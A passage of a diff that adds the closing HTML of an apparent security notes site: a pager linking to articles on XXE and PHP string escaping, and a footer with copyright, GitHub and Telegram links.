+    <nav class="pager" aria-label="文章翻页"><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-510029820ba7.html"><small>上一篇</small>一、XXE中的使用</a><a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b63de059884b.html"><small>下一篇</small>一、php: addslashes()、mysqlescapestring()</a></nav>
+  </main>
+  <footer><div class="shell">
+    <span>© 2026 BEN.OPS</span>
+    <a href="https://github.com/ben2023niao/ben-ops-notes">GitHub</a>
+    <a href="https://t.me/Ben_Bird">Telegram @Ben_Bird</a>
+    <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-b5649559bd4c.html">本页永久链接</a>
+  </div></footer>
+</body>
+</html>
